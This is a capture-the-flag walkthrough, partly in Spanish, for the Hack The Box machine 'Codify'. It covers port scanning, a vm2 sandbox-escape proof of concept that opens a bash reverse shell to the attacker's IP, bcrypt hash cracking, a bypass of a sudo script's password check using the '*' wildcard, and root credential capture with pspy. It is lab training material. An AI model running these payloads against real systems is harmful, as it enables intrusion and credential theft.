---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Codify





```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.239 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 17:40 CET
Initiating SYN Stealth Scan at 17:40
Scanning 10.10.11.239 [65535 ports]
Discovered open port 80/tcp on 10.10.11.239
Discovered open port 22/tcp on 10.10.11.239
Discovered open port 3000/tcp on 10.10.11.239
Completed SYN Stealth Scan at 17:40, 17.95s elapsed (65535 total ports)
Nmap scan report for 10.10.11.239
Host is up, received user-set (0.18s latency).
Scanned at 2025-02-14 17:40:41 CET for 17s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.04 seconds
           Raw packets sent: 67123 (2.953MB) | Rcvd: 67133 (2.686MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.239
	[*] Open ports: 22,80,3000

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80,3000 10.10.11.239 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 17:42 CET
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.088s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Codify
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   112.21 ms 10.10.16.1
2   44.32 ms  codify.htb (10.10.11.239)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.85 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/4940_vmware_Ezk4NhCM1x.png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep codify
10.10.11.239 codify.htb
```



<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>



```bash
❯ dirsearch -u 'http://codify.htb' -t 50 -i 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Codify/Codify/reports/http_codify.htb/_25-02-14_17-47-17.txt

Target: http://codify.htb/

[17:47:17] Starting: 
[17:47:26] 200 -    1KB - /about
[17:47:26] 200 -    1KB - /About
[17:47:49] 200 -    1KB - /editor/
[17:47:49] 200 -    1KB - /editor

Task Completed
```





<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244" %}





```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('echo /usr/bin/id');
}
`

console.log(vm.run(code));
```





<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>





```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('/bin/bash -c "bash -i >& /dev/tcp/10.10.16.7/443 0>&1"');
}
`

console.log(vm.run(code));
```



<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.239] 35090
bash: cannot set terminal process group (1260): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$
```



```bash
svc@codify:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)

svc@codify:~$ sudo -l
[sudo] password for svc: 
sudo: a password is required

svc@codify:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```



```bash
svc@codify:/var/www/contact$ strings tickets.db 
SQLite format 3
otableticketstickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
	tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    ))
indexsqlite_autoindex_users_1users
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
joshua
users
tickets
Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```





```bash
❯ hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```





```bash
❯ ssh joshua@codify.htb
joshua@codify.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

Last login: Wed Mar 27 13:01:24 2024 from 10.10.14.23

joshua@codify:~$ cat user.txt 
745818a77e722f5afe49a8d85b11edee
```



```bash
joshua@codify:~$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
```



```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```



```bash
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```





<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>



```bash
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmation failed!
```



El script original verifica la contraseña de MySQL con la siguiente condición en Bash:

```sql
if [[ $DB_PASS == $USER_PASS ]]; then
```

Sin embargo, esta validación puede ser vulnerable a un bypass cuando se utiliza el carácter `*` en la variable `DB_PASS`. En Bash, el `*` es un comodín que coincide con cualquier valor, lo que hace que la comparación del `if` siempre sea verdadera, independientemente del valor de la contraseña ingresada.

Por ejemplo, si un atacante inserta `*` en la variable `USER_PASS`, la condición `if` se evaluará como verdadera, permitiendo el bypass de la verificación.

**Posible Exposición de Contraseña a través de Procesos**

Tras realizar el bypass, un atacante podría intentar observar los procesos en ejecución para obtener las credenciales. Si el script está interactuando con la base de datos o realizando operaciones donde la contraseña esté presente en los parámetros o el entorno del proceso, es posible que la contraseña se pueda ver revisando los procesos del sistema como `Pspy`.



```bash
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```



```bash
❯ ls -l pspy64
.rwxr-xr-x kali kali 3.0 MB Tue Jan 17 22:09:52 2023  pspy64

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
joshua@codify:~$ wget 10.10.16.7/pspy64
--2025-02-14 17:23:40--  http://10.10.16.7/pspy64
Connecting to 10.10.16.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                    100%[==================================================================================================================================>]   2.96M  1.20MB/s    in 2.5s    

2025-02-14 17:23:42 (1.20 MB/s) - ‘pspy64’ saved [3104768/3104768]

joshua@codify:~$ chmod +x pspy64
```



```
joshua@codify:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/02/14 17:25:00 CMD: UID=1000  PID=2282   | ./pspy64 
2025/02/14 17:25:00 CMD: UID=1000  PID=2270   | -bash 
2025/02/14 17:25:00 CMD: UID=1000  PID=2269   | sshd: joshua@pts/0   
2025/02/14 17:25:00 CMD: UID=0     PID=2211   | 
```



```bash
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```



```bash
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done

...[snip]...

2025/02/14 17:28:08 CMD: UID=0     PID=2428   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/02/14 17:28:08 CMD: UID=0     PID=2430   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/02/14 17:28:08 CMD: UID=0     PID=2429   | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES; 
```



```bash
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# cat /root/root.txt 
16a752da1ccc4b62293ea1afd85b7e27
```
